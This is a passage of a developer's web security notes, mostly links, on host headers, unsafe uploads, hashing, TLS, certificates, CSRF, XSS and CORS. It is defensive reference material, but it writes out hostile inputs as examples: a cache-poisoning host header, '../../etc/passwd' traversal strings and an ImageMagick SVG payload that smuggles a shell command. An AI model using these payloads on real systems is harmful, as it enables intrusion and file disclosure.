	- [server-configs-nginx/no-default at master · h5bp/server-configs-nginx](https://github.com/h5bp/server-configs-nginx/blob/master/sites-available/no-default)
	
	```
	# Ngnix
	# no default server
	# prevent host header attacks, or other potential problems when an unknown servername is used in a request, drop the request
	server {
		listen 80 default_server;
		return 444;
	}
	```
- HTTP Cache poisoning using Host header: `Host: evilsite.com#`
	* [15KB Of Fame: HTTP Cache Poisoning via Host Header Injection](http://carlos.bueno.org/2008/06/host-header-injection.html)
	* [Skeleton Scribe: Practical HTTP Host header attacks](http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)
	* [HTTP HOST header attacks](http://www.slideshare.net/DefconRussia/http-host-header-attacks)
	
	See also [Cache Poisoning - OWASP](https://www.owasp.org/index.php/Cache_Poisoning)
- take care of HTTP headers especially `Host`, `Origin`, `Referer`, etc. Don't trust `User-Agent`. Clean value in returned `Location`, `Set-Cookie` (escape them)

##### Unsafe filename

For filename see also [Unsafe URI](#unsafe-uri) and [Unsafe name](#unsafe-name)

- filename, remove path separators `/` and ignore `.` and `..` (ex: `../../etc/passwd`, `folder/../../../etc/passwd`) or use something like `in_array(array_diff(scandir($directory), array('..', '.')), $filename)` to compare
- check filename of uploaded files. Some lib (like ImageMagick) use patterns to treat files: `*`, `@`, `#`, `|`, `` `: [File Handling -- IM v6 Examples](http://www.imagemagick.org/Usage/files/)
	example, an uploaded SVG handled server side by ImageMagick: `<svg><image xlink:href="|echo Hello > hello.txt; cat /usr/lib/firefox/browser/icons/mozicon128.png"></image></svg>`
	* [CVE-2016-5118 : The OpenBlob function in blob.c in GraphicsMagick before 1.3.24 and ImageMagick allows remote attackers to execute arbit](http://www.cvedetails.com/cve/CVE-2016-5118/)
	* [oss-sec: CVE Request: GraphicsMagick and ImageMagick popen() shell vulnerability via filename](http://seclists.org/oss-sec/2016/q2/432)
- remove any special chars

##### Unsafe files content

From upload and loaded files / data

See [Unsafe filename](#unsafe-filename)

- check upload file type with magic number:
	* [Remote code execution vulnerability in ImageMagick | Hacker News](https://news.ycombinator.com/item?id=11624056)
	* List of blacklisted types by MediaWiki [Manual talk:$wgMimeTypeBlacklist - MediaWiki](https://www.mediawiki.org/wiki/Manual_talk:$wgMimeTypeBlacklist#Default_changed_in_1.17)
	* [HTML/SVG/XML vulnerabilities](#htmlsvgxml-vulnerabilities)
- check upload file content:
	- [Secure user uploads and exploiting served user content](https://opensourcehacker.com/2013/07/31/secure-user-uploads-and-exploiting-served-user-content/)
	- [exploit - How should I serve untrusted / unsanitized documents (PDF, DOC, XLS) to end users over the web? - Information Security Stack Exchange](http://security.stackexchange.com/questions/11995/how-should-i-serve-untrusted-unsanitized-documents-pdf-doc-xls-to-end-user)
	- [Unrestricted File Upload - OWASP](https://www.owasp.org/index.php/Unrestricted_File_Upload)
	- [Assembla security exploit: session take over – Medium](https://medium.com/@yvoschaap/assembla-security-exploit-session-take-over-fca6697c095a#.2ukp7skia)
- A simple file/image can be used to attack using an out of bounds memory write
- image metadata can contains XSS scripts
	- [EXIF Cross Site Scripting, PHP Fun – Confessions Of A Dangerous Mind](http://www.sectorix.com/2013/12/02/exif-cross-site-scripting-php-fun/)
	- [Malware Hidden Inside JPG EXIF Headers](https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html)
- A simple archive or an image (PNG) can act as a bomb:
	- [Deflate Decompression Bomb](Deflate#Decompression Bomb)
	- [ZIP Decompression Bomb](ZIP#Decompression Bomb)
	- [PNG Decompression Bomb](PNG#Decompression Bomb)
	- [JPEG Bomb](JPEG#Decompression Bomb)
	- [Tarbomb](Tar#Tarbomb)
	
	Workaround: define size or max memory limits (`width * height > max_pixels_limit`)

##### Unsafe name

Name for: username, page name, application name, etc.

Remove diacritics, [normalize](http://www.unicode.org/reports/tr15/), replace [confusables](http://www.unicode.org/Public/security/6.3.0/confusables.txt). See ["use special chars or lookalike chars"](#obfuscation-code))

Don't allow (approve) name change too often

Don't allow famous brand or product (Apple, Google, Amazon, etc.) and lookalike typos Gooogle , Amezon, Facebok, etc.

When users can create an email address `***@domain.ext` with filtering the name like: admin, administrator, mailer-daemon, postmaster, hostmaster or webmaster

Forbid (rewrite) `robots.txt` as username: `domain.ext/username` (use `robots-txt`), `delete` as username `domain.ext/user/delete` (use `delete_username`)

- [Hostname and username to reserve](https://zimbatm.github.io/hostnames-and-usernames-to-reserve/)
- [GitHub i forcing me to change my username, and will not tell me why | Hacker News](https://news.ycombinator.com/item?id=16555451)
- [Microsoft takes 4 years to recover privileged TLS certificate addresses | Ars Technica](http://arstechnica.com/security/2015/03/microsoft-takes-4-years-to-recover-privileged-tls-certificate-addresses/)
- [People's Names That Break Websites | CSS-Tricks](https://css-tricks.com/peoples-names-break-websites/)
- [PSA: Two Different Developers, under the SAME NAME. : Android](https://www.reddit.com/r/Android/comments/7ahujw/psa_two_different_developers_under_the_same_name/)
- [FAQ - Normalization](http://unicode.org/faq/normalization.html)
- [UTS #39: Unicode Security Mechanisms](http://www.unicode.org/reports/tr39/#confusables)

#### Disposable email address

- [Disposable email address - Wikipedia](https://en.wikipedia.org/wiki/Disposable_email_address)
- [The Ultimate Disposable Email Provider List (2017 update)](https://www.ghacks.net/2012/05/31/the-ultimate-disposable-email-provider-list-2012/)
- [List of disposable email provider domains](https://gist.github.com/michenriksen/8710649)
- [A list of domains for disposable and temporary email addresses. Useful for filtering your email list to increase open rates (sending email to these domains likely will not be opened).](https://gist.github.com/adamloving/4401361)
- [Detect temporary mails - Block Disposable Email Addresses - IsTempMail](https://www.istempmail.com/)
- [List of temporary email domains as of 2018-02-06 and disposable email detection, fake user prevention](https://www.block-disposable-email.com/cms/)

#### Hash and keys

**Never make your own cryptography library.**
**Hash: always use salt**

- [How data encryption software creates one way hash files using the sha1 hashing algorithm.](http://www.metamorphosite.com/one-way-hash-encryption-sha1-data-software)
- [Choosing the Right Cryptography Library for your PHP Project: A Guide - Paragon Initiative Enterprises Blog](https://paragonie.com/blog/2015/11/choosing-right-cryptography-library-for-your-php-project-guide)
- [Pure PHP polyfill for ext/sodium](https://github.com/paragonie/sodium_compat) - Polyfill for libsodium in PHP (libsodium is included by default in PHP 7.2)
- as3crypto
	Partial TLS 1.0 support, RSA,  AES, DES, 3DES, BlowFish, XTEA, RC4, MD2, MD5, SHA-1, SHA-224, SHA-256, etc.
	
	- http://code.google.com/p/as3crypto (official repo and issues)
	- https://github.com/timkurvers/as3-crypto (based on as3crypto 1.3)
	- https://github.com/lyokato/as3crypto_patched (based on as3crypto 1.3)
- [Stanford Javascript Crypto Library](https://github.com/bitwiseshiftleft/sjcl)
- [A modern and easy-to-use crypto library. ](https://github.com/jedisct1/libsodium)
- [ActionScript (AS3) library for processing binary data](https://github.com/blooddy/blooddy_crypto)
	MD5, SHA-1, SHA-2 ( SHA-224 и SHA-256 ), Base64, CRC32 algorithms, JSON encoder & decoder as well as PNG and JPEG encoders.
- [hash - SHA512 faster than SHA256? - Cryptography Stack Exchange](http://crypto.stackexchange.com/questions/26336/sha512-faster-than-sha256) Works only with implementation using 64-bit integer operations (not JS), see [SHA-512 is 1.5x faster than SHA-256 on 64-bit platforms | Hacker News](https://news.ycombinator.com/item?id=13547042)
- [Length extension attack — Wikipedia](https://en.wikipedia.org/wiki/Length_extension_attack)
- [Lifetimes of cryptographic hash functions](http://valerieaurora.org/hash.html)
- [Looks Like It - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/432-Looks-Like-It.html) and [Kind of Like That - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/529-Kind-of-Like-That.html) - perceptual hashes
- [Comparing -- IM v6 Examples](http://www.imagemagick.org/Usage/compare/#metric_perceptual_hash) - Perceptual Hash
- [Perceptual Hash - ImageMagick](https://www.imagemagick.org/discourse-server/viewtopic.php?t=25061)

Check hash and keys leak or reversed (hashes):

- [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
- [HashKiller.co.uk, Over 1.45387 trillion decrypted hashes in total, Free Hash Cracker, Online Hash Cracker](https://hashkiller.co.uk/)
- [Searches through git repositories for high entropy strings, digging deep into commit history](https://github.com/dxa4481/truffleHog)
- [Collection of github dorks and helper tool to automate the process of checking dorks](https://github.com/techgaun/github-dorks) (search for sensitive data on the repositories)
- [Detect secret leaks in Android Apps](https://android.fallible.co/)

Data checksum:

```sh
# SHA512
shasum -a 512 /path/to/file
openssl sha512 /path/to/file
# MD5
md5 /path/to/file
openssl md5 /path/to/file
```

Hash collision:

![PDF Sha1 Collision](Prevent%20violation/Hash%20and%20keys/PDF%20sha1%20collision.jpg)

- [Google Online Security Blog: Announcing the first SHA1 collision](https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html) and [SHAttered](https://shattered.it/)
- [sha1collisiondetection](https://github.com/cr-marcstevens/sha1collisiondetection) - Library and command line tool to detect SHA-1 collision in a file
- https://github.com/nneonneo/sha1collider - Build two PDFs that have different content but identical SHA1 sums
- [Nat McHugh: How I created two images with the same MD5 hash](https://natmchugh.blogspot.com/2014/10/how-i-created-two-images-with-same-md5.html)
	and [Nat McHugh: Three way MD5 collision](https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html)
- [Project HashClash - Project HashClash](https://marc-stevens.nl/p/hashclash/)
	- [cr-marcstevens/hashclash: Project HashClash - MD5 & SHA-1 cryptanalysis](https://github.com/cr-marcstevens/hashclash)
	- [hashclash-old-svn-repo/downloads at master · cr-marcstevens/hashclash-old-svn-repo](https://github.com/cr-marcstevens/hashclash-old-svn-repo/tree/master/downloads)
	- [Chosen-prefix Collisions](http://www.win.tue.nl/hashclash/ChosenPrefixCollisions/)
	- [Marc Stevens - Research](https://marc-stevens.nl/research/)

#### Data scraping

- [The ultimate guide on preventing Website Scraping](https://github.com/JonasCz/How-To-Prevent-Scraping)
- [Web scraping — Wikipedia](https://en.wikipedia.org/wiki/Web_scraping)
- [html - How do I prevent site scraping? - Stack Overflow](https://stackoverflow.com/questions/3161548/how-do-i-prevent-site-scraping/34828465#34828465)

See [Web scrapping](../Data/Web%20scrapping/Web%20scrapping.md)

#### Know your weaknesses

See [Vulnerabilities](#vulnerabilities)

**… and solve it!**

- [Security Tips - Apache HTTP Server Version 2.4](https://httpd.apache.org/docs/2.4/en/misc/security_tips.html)
- [httpd 2.2 vulnerabilities - The Apache HTTP Server Project](https://httpd.apache.org/security/vulnerabilities_22.html)
- [httpd 2.4 vulnerabilities - The Apache HTTP Server Project](https://httpd.apache.org/security/vulnerabilities_24.html)
- https://httpd.apache.org/security/vulnerabilities-httpd.xml

Make [pentest / penetration test](https://en.wikipedia.org/wiki/Penetration_test), create a [bug bounty program](https://en.wikipedia.org/wiki/Bug_bounty_program)

- [Penetration Testing Software | Metasploit](https://www.metasploit.com/)
- [enaqx/awesome-pentest: A collection of awesome penetration testing resources, tools and other shiny things](https://github.com/enaqx/awesome-pentest)

#### Man of the middle

> Why are people surprised that having a service MITM your TLS traffic creates an point of exposure?
— Aaron Beuhring

- HTTPS (TLS), HPKP
- postmessage third part window for validate and generate encypted data (like a client and server), require an extra tab be always opened
- Encrypt data on server too: [Mylar](http://css.csail.mit.edu/mylar/)
- Allow to verify public keys IRL: [Open Whisper Systems >> Blog >> WhatsApp's Signal Protocol integration is now complete](https://www.whispersystems.org/blog/whatsapp-complete/)

It's possible to make calculation on encrypted data using [Homomorphic encryption](https://en.wikipedia.org/wiki/Homomorphic_encryption).

- [Zero-knowledge proof — Wikipedia](https://en.wikipedia.org/wiki/Zero-knowledge_proof)
- [The Netflix Tech Blog: Message Security Layer: A Modern Take on Securing Communication](http://techblog.netflix.com/2014/10/message-security-layer-modern-take-on.html)
- [Message Security Layer](https://github.com/Netflix/msl)

##### Transport Layer Security

Aka TLS

See also [Client Certificate](#client-certificate)

TLS JavaScript Implementation

- [digitalbazaar/forge: A native implementation of TLS in Javascript and tools to write crypto-based and network-heavy webapps](https://github.com/digitalbazaar/forge)
- [A JavaScript Implementation of TLS (Part 1/2) « Digital Bazaar](http://digitalbazaar.com/2010/07/20/javascript-tls-1/) and [A JavaScript Implementation of TLS (Part 2/2) « Digital Bazaar](http://digitalbazaar.com/2010/07/20/javascript-tls-2/)
- [Moxie Marlinspike \>> Software >> sslstrip](https://moxie.org/software/sslstrip/)

**Never mix HTTP and HTTPS, because HTTP parts can be compromised, even in navigation (page 1 HTTP -> page 2 HTTPS, via link, form or redirection).** Use [CSP](#content-security-policy) `block-all-mixed-content` or `upgrade-insecure-requests`.

Note: Root certificate can be compromises (by a malware, by the manufacturer, etc.) on the client machine.

- [SSL Server Test (Powered by Qualys SSL Labs)](https://www.ssllabs.com/ssltest/)
- [HTTPS encryption on the web – Google Transparency Report](https://transparencyreport.google.com/https/certificates?cert_search_auth=&cert_search_cert=&cert_search=include_expired:true;include_subdomains:false&lu=cert_search)
- [Reparlons de Let’s Encrypt - LinuxFr.org](https://linuxfr.org/news/reparlons-de-let-s-encrypt#lauthentification-http-01)
- [Challenge Types - Let's Encrypt - Free SSL/TLS Certificates](https://letsencrypt.org/docs/challenge-types/)
- [Transport Layer Security — Wikipedia](https://en.wikipedia.org/wiki/Transport_Layer_Security)
- [Public key cryptography - Diffie-Hellman Key Exchange](Public%20key%20cryptography%20-%20Diffie-Hellman%20Key%20Exchange%20%28full%20version%29%20%28480p%29.mp4)
- [PinPatrol :: Add-ons for Firefox](https://addons.mozilla.org/en-US/firefox/addon/pinpatrol/) shows HSTS and HPKP domains stored by the browser
- [Certificate and Public Key Pinning - OWASP](https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning)
- [HTTP Strict Transport Security - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security) and [HSTS Preload Submission](https://hstspreload.appspot.com/)
- [HTTP Public Key Pinning - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning)
- [Robert Love · Blog: Everything you Need to Know about HTTP Public Key Pinning (HPKP)](http://blog.rlove.org/2015/01/public-key-pinning-hpkp.html)
- [Cool Solutions: Decrypting SSL Traffic to Troubleshoot NAM](http://www.novell.com/coolsolutions/appnote/19321.html)
- [The First Few Milliseconds of an HTTPS Connection](http://www.moserware.com/2009/06/first-few-milliseconds-of-https.html)
- [A basic guide to when and how to deploy HTTPS — Erik Romijn](http://erik.io/blog/2013/06/08/a-basic-guide-to-when-and-how-to-deploy-https/)
- [5 easy tips to accelerate SSL – Unhandled expression](https://unhandledexpression.com/2013/01/25/5-easy-tips-to-accelerate-ssl/)
- [cryptography - "Diffie-Hellman Key Exchange" in plain English - Information Security Stack Exchange](http://security.stackexchange.com/questions/45963/diffie-hellman-key-exchange-in-plain-english/45971)
- [Nick Craver - HTTPS on Stack Overflow: The End of a Long Road](https://nickcraver.com/blog/2017/05/22/https-on-stack-overflow/)
- [HTTPS : de SSL à TLS 1.3 | Openweb.eu.org](https://openweb.eu.org/articles/https-de-ssl-a-tls-1-3)
- [How to Use SSL/TLS with Node.js — SitePoint](https://www.sitepoint.com/how-to-use-ssltls-with-node-js/)
- [Understanding the Limitations of HTTPS | text/plain](https://textslashplain.com/2018/02/14/understanding-the-limitations-of-https/)
- [Still think you don't need HTTPS?](https://scotthelme.co.uk/still-think-you-dont-need-https/)
- [Why do we need HTTPS? - How HTTPS works](https://howhttps.works/why-do-we-need-https/)

###### Self-signed certificate

Create an self-signed certificate (SSC)

```sh
# Create self signed certificate for 10 years (no use shorter validity for production):
# Inline openssl extension config file:
openssl req -newkey rsa:4096 -x509 -days 3650 -sha256 -config <(echo -e "[req]\ndistinguished_name=dn\n[dn]\n[ext]\nbasicConstraints=CA:false\nsubjectAltName=DNS:*.domain.com") -extensions ext -nodes -subj "/C=FR/ST=IDF/L=Paris/O=ACME/OU=Development/CN=*.domain.com/emailAddress=admin@domain.com" -keyout .domain.com.key -out .domain.com.crt
# For subjectAltName syntax see http://blog.endpoint.com/2013/10/ssl-certificate-sans-and-multi-level.html
# subjectAltName=DNS=*.domain.com
# -subj ".../.../subjectAltName=DNS.1=example.com, DNS.2=www.example.com, DNS.3=billing.example.com"
```

```sh
# Read certificate
openssl x509 -text -noout -in domain.ext.crt
```

`-nodes` (no DES): the created private key is it will not be encrypted. Usefull on a webserver. Else it require after each reboot to provide or store the password to decrypt the private key.

Self-signed CA vs self-signed certificate:

- self-signed certificate. Install it in the root keystore of the client and the server use it.
- self-signed CA certificate (Certifying Authority certificate, require [X.509 Basic Constraints](https://tools.ietf.org/html/rfc5280#section-4.2.1.9) `CA=TRUE`), used to sign a certificate (end entity cert). Install the root cert in the root keystore of the client and the server use the entity cert.
- self-signed CA certificate, signed intermediate certificate and a end-entity cert.

Note: Android require Basic constraints extension ("CA flag") to be set to `TRUE`.
Note: Chrome 58 and Firefox 48 require Subject Alternative Name (SAN) (`subjectAltName`) for the domain(s) name(s), to define all domains used by this certificate

<details>
<summary>
How to create a trusted certificate on Windows
</summary>
	
Create a trusted certificate:

1. open "Microsoft Management Console (MMC)" (Run/Win+R "mmc", then OK)
2. if required:
	1. click "File > Add/Remove Snap-in"
	2. select "Certificats", click "Add >"
	3. select "Computer Account"
	4. click "Next" then "Finish" then "OK"
3. expand "Certificates (Local Computer) > Personal > Certificates" and right click on it, then "All Tasks > Advanced Operations > Create Custom Request..."
4. click "Next"
5. select "Proceed without enrollment policy", click "Next"
6. click "Next" (keep default: template "(No template) CNG Key", and request format "PCKS #10")
7. click "Details", "Properties"
8. set "Friendly name", like your computer name or `mydevice.local`
9. in "Subject" tab:
	1. in subject name, select "Common name" and set the value to `mydevice.local`, then click "Add >"
	2. in alternative name, select "DNS" ans set the value to `mydevice.local`, then click "Add >"
	3. in alternative name, select "DNS" ans set the value to `*.example.com`, then click "Add >"
10. in "Extensions" tab:
	1. in "Extended Key Usage (application policies)" section, select "Server Authentification", then click "Add >"
	2. in "Basic Constraints" section, check "Enable this extension"
11. in "Private Key" tab:
	1. in "Key options" section, check "Make private key exportable"
	2. in "Select Hash Algorithm" section, choose a "Hash Algorithm" (use SHA-2: sha256, sha384 or sha512)
12. click "OK", "Next"
13. browser and set a file name
14. in "Certificate Enrollment Requests > Certificats", select the created certificate and cut
15. past it in "Personnal > Certificates" and copy + past it in "Trusted Root Certification Authorities > Certificates"

If you want to trust that certificate on other machine, on the server machine:

1. open MMC
2. in "Personnal > Certificates", select the certificate and open it
3. in "Details" tab, click "Copy to File", "Next", "Next", select the right format

On each client machine:

1. open MMC
2. in "Trusted Root Certification Authorities > Certificates", "Other actions > All tasks > Import..."
3. click "Next", select the certificate file
4. click "Next", check is the certificate store is "Trusted Root Certification Authorities"
5. click "Finish"

</details>

- mkcert:
    - [FiloSottile/mkcert: A simple zero-config tool to make locally trusted development certificates with any names you'd like.](https://github.com/FiloSottile/mkcert)
    - [mkcert: valid HTTPS certificates for localhost](https://blog.filippo.io/mkcert-valid-https-certificates-for-localhost/) (*.localhost domains)
- [Certificates for localhost - Let's Encrypt - Free SSL/TLS Certificates](https://letsencrypt.org/docs/certificates-for-localhost/#making-and-trusting-your-own-certificates)
- [ssl - Difference between self-signed CA and self-signed certificate - Stack Overflow](https://stackoverflow.com/questions/4024393/difference-between-self-signed-ca-and-self-signed-certificate)
- [Self-signed SSL certificates, CA flagged true, for Android and OS X | Best Mac Tips](http://best-mac-tips.com/2015/05/28/self-signed-ssl-certificates-ca-true-android-os-x/)
- [Des certificats signés par votre autorité de certification avec OpenSSL - Jeyg.info](http://jeyg.info/des-certificats-signes-par-votre-autorite-de-certification-avec-openssl/)
- [OpenSSL CA and non CA certificate - Super User](https://superuser.com/questions/462295/openssl-ca-and-non-ca-certificate)
- [OpenSSL (Keys and Certificates) · HOWTO setup a small server · Ch. Schneider](http://chschneider.eu/linux/server/openssl.shtml)
- [certificates - SSL/TLS: Policy Constraints vs. Basic Constraints - Information Security Stack Exchange](https://security.stackexchange.com/questions/110686/ssl-tls-policy-constraints-vs-basic-constraints)
- [A Web PKI x509 certificate primer - Mozilla | MDN](https://developer.mozilla.org/en-US/docs/Mozilla/Security/x509_Certificates)
- [ssl - How to create a self-signed certificate with openssl? - Stack Overflow](https://stackoverflow.com/questions/10175812/how-to-create-a-self-signed-certificate-with-openssl/27931596#27931596)
- [OpenSSL man page: req](https://www.openssl.org/docs/manmaster/man1/req.html)
- [Chrome: Invalid self signed SSL cert - "Subject Alternative Name Missing" - Stack Overflow](https://stackoverflow.com/questions/43665243/chrome-invalid-self-signed-ssl-cert-subject-alternative-name-missing)
- [Fixing Chrome 58+ \[missing_subjectAltName\] with openssl when using self signed certificates | Alexander Zeitler](https://alexanderzeitler.com/articles/Fixing-Chrome-missing_subjectAltName-selfsigned-cert-openssl/)
- [FAQ/subjectAltName - CAcert Wiki](http://wiki.cacert.org/FAQ/subjectAltName)
- [CertSimple | Your OpenSSL CSR command is out of date](https://certsimple.com/blog/openssl-csr-command)
- [CertSimple | Never see localhost HTTPS warnings again](https://certsimple.com/blog/localhost-ssl-fix)
- [How to Setup HTTPS Locally Without Getting Annoying Browser Privacy Errors](https://deliciousbrains.com/https-locally-without-browser-privacy-errors/)
- [How to get HTTPS working on your local development environment in 5 minutes](https://medium.freecodecamp.org/how-to-get-https-working-on-your-local-development-environment-in-5-minutes-7af615770eec)
- [SHA-256 Self Signed Certificate for Windows Server 2012 R2 – Mayur's Blog](https://blogs.msdn.microsoft.com/mayurpatankar/2017/09/01/sha-256-self-signed-certificate-for-windows-server-2012-r2/)

###### HTTP Strict Transport Security

Aka HSTS

Force TLS (HTTPS), in `.htaccess`:

```apache
# 2 years
Header always set Strict-Transport-Security "max-age=63072000; includeSubdomains; preload"
```

Should redirect HTTP to HTTPS first, then the browser remember it.

- [HTTP Strict Transport Security — Wikipedia](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
- [HTTP Strict Transport Security Cheat Sheet - OWASP](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet)
- [Strict-Transport-Security - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
- [HSTS](htaccess#hsts)
- [How to clear HSTS Settings in Major Browsers | that's so … classically.me](http://classically.me/blogs/how-clear-hsts-settings-major-browsers) - Chrome / Opera: `chrome://net-internals/#hsts`, Safari: `~/Library/Cookies/HSTS.plist`, Firefox `%firefox_profile%/SiteSecurityServiceState.txt`

Firefox:

- Regular browsing mode: HSTS persists across sessions.
- Private browsing mode: HSTS information are deleted after the session.

###### Decrypt TLS

`SSLKEYLOGFILE`
`sudo tcpdump -i en0 -s 0 tcp port https -w ~/Desktop/capture.pcap`
Chrome [`--ssl-key-log-file=file`](https://peter.sh/experiments/chromium-command-line-switches/#ssl-key-log-file)

- [NSS Key Log Format - Mozilla | MDN](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Key_Log_Format)
- [Decrypting TLS Browser Traffic With Wireshark – The Easy Way! | Jim Shaver](https://jimshaver.net/2015/02/11/decrypting-tls-browser-traffic-with-wireshark-the-easy-way/)
- [TLS Master Secrets — mitmproxy 2.0.2 documentation](https://mitmproxy.readthedocs.io/en/v2.0.2/dev/sslkeylogfile.html)
- [Inspect curl’s TLS traffic | daniel.haxx.se](https://daniel.haxx.se/blog/2018/01/15/inspect-curls-tls-traffic/)
- [SSL key logging (aka SSLKEYLOGFILE) – Welcome to the Windows developer feedback site!](https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/16310230-ssl-key-logging-aka-sslkeylogfile)
- [Article: K10209 - Overview of packet tracing with the ssldump utility](https://support.f5.com/csp/article/K10209)
- [Chrome not Firefox are not dumping to SSLKEYLOGFILE variable - Stack Overflow](https://stackoverflow.com/questions/42332792/chrome-not-firefox-are-not-dumping-to-sslkeylogfile-variable)
- [CertPinning - Fiddler](http://fiddler.wikidot.com/certpinning)
- [Bypassing OpenSSL Certificate Pinning in iOS Apps](https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2015/january/bypassing-openssl-certificate-pinning-in-ios-apps/) - Doesn't work on recent iOS versions

#### Cookie-to-Header Token

**It's based on the assumption that only JavaScript running within the same origin will be able to read the cookie's value.**

```js
fetch(url, {
	credentials: "include",
	mode: "cors",
	headers: {
		"Accept": "application/json",
		"X-Csrf-Token": getCookieValue("Csrf-token")
	}
});
```

- [Cross-site request forgery — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Cookie-to-Header_Token)

#### XSS and injection prevention

For HTML, use:

- `crossorigin` attribute for [`<script>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-crossorigin), [`<img>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img#attr-crossorigin)
- `noopener`
- `Content-Security-Policy: frame-ancestors 'self'` header (or the depreciated `X-Frame-Options: SAMEORIGIN`)
- `X-Content-Type-Options: nosniff` header (discard content detection = use only `Content-Type` header)
- [Subresource Integrity](#subresource-integrity)
- [Content Security Policy](#content-security-policy)
- [Cross-Origin Resource Sharing](#cross-origin-resource-sharing)
- use `SameSite=Strict` cookies

- add a timestamp (use it also to create the "nonce") and check the diff time (depends how much input number is), a user require a minimum of few seconds
- Other prevention techniques [Cross-site request forgery — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention)
- use a [nonce](https://en.wikipedia.org/wiki/Cryptographic_nonce) (see Wordpress `wp_create_nonce()`) field to protect against CSRF (Cross-Site Request Forgery)
- [Cookies for Comments — WordPress Plugins](https://wordpress.org/plugins/cookies-for-comments/)
- (require cookies) add unique image/js/css resource (`<script src="script.php?UNIQ_ID"></script>`), when this resource is called add a cookie. When the form is POST, check if the cookie exist

About XSS and service workers:

- [XSS with ServiceWorkers · Learning Man](https://blog.sari3l.com/posts/a62f29f1/)
- [RootkitXSS之ServiceWorker - 先知社区](https://xz.aliyun.com/t/3228)
- [ServiceWorker is dangerous](https://alf.nu/ServiceWorker)
- [Frederik Braun : Challenge Write-up: Subresource Integrity in Service Workers](https://frederik-braun.com/sw-sri-challenge.html)

For JSON, use (affect only old browsers):

- proper headers: `Content-Type: application/json` and `x-content-type-options: nosniff`
- [AJAX Security Cheat Sheet - OWASP](https://www.owasp.org/index.php/AJAX_Security_Cheat_Sheet#Protect_against_JSON_Hijacking_for_Older_Browsers)
- [jquery - Is it possible to XSS exploit JSON responses with proper JavaScript string escaping - Stack Overflow](https://stackoverflow.com/questions/3146324/is-it-possible-to-xss-exploit-json-responses-with-proper-javascript-string-escap)
- prefix with `for(;;);` or `)]}'`
- [Polyglot JSON - JS file](#polyglot-json---js-file)

See also

- [Polyglot HTML - JPEG file](#polyglot-html---jpeg-file)
- [DOM clobbering](#dom-clobbering)
- [Cross-site scripting — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
- [Link types - HTML | MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Link_types)
- [Source-Breaking Injections - Fooling the Interpreter](http://brutelogic.com.br/blog/source-breaking-injections/)
- [Things to Know (and Potential Dangers) with Third-Party Scripts | CSS-Tricks](https://css-tricks.com/potential-dangers-of-third-party-javascript/)
- [javascript - Could anyone explain these XSS test strings? - Stack Overflow](https://stackoverflow.com/questions/25461418/could-anyone-explain-these-xss-test-strings)
- [ArticlesXSS - doctype-mirror - Articles about web security - Mirror of Google Doctype - Google Project Hosting](https://code.google.com/p/doctype-mirror/wiki/ArticlesXSS)
- [php - Is json_encode Sufficient XSS Protection? - Stack Overflow](https://stackoverflow.com/questions/12062146/is-json-encode-sufficient-xss-protection)
- [HTML5 Security Cheatsheet - A collection of HTML5 related XSS attack vectors](https://github.com/cure53/H5SC)
- `SameSite` cookies CSRF tokens [GitHub’s post-CSP journey - GitHub Engineering](https://githubengineering.com/githubs-post-csp-journey/#same-site-cookies)
- Prevention of [cross-site request forgery — Wikipedia](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention)
- [Cryptographic nonce — Wikipedia](https://en.wikipedia.org/wiki/Cryptographic_nonce) (see Wordpress `wp_create_nonce()`)
- [Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet)
- [Same-origin policy — Wikipedia](https://en.wikipedia.org/wiki/Same-origin_policy)
- [Same-origin policy - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [Cross-Site Request Forgery is dead!](https://scotthelme.co.uk/csrf-is-dead/)
- [s0md3v/XSStrike: Most advanced XSS detection suite.](https://github.com/s0md3v/XSStrike)1
- [The British Airways Breach: How Magecart Claimed 380,000 Victims](https://www.riskiq.com/blog/labs/magecart-british-airways-breach/) - [Card-stealing code that pwned British Airways, Ticketmaster pops up on more sites via hacked JS • The Register](https://www.theregister.co.uk/2018/09/12/feedify_magecart_javascript_library_hacked/), [Magecart – Darknet Diaries](https://darknetdiaries.com/episode/52/)

##### Subresource Integrity

Use `integrity` attribute for `<script>` and `<link>`

- [Subresource Integrity](https://www.w3.org/TR/SRI/)
- [Subresource Integrity - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)

##### Cross-Origin Resource Sharing

Aka CORS

Note: Be carefull and don't mix `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` without know what your are doing

`Access-Control-Allow-Origin: *` means [“anonymous requests only”](https://w3c.github.io/webappsec-cors-for-developers/#anonymous-requests-or-access-control-allow-origin)

- [HTTP access control (CORS) - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS)
- [Using CORS - HTML5 Rocks](http://www.html5rocks.com/en/tutorials/cors/)
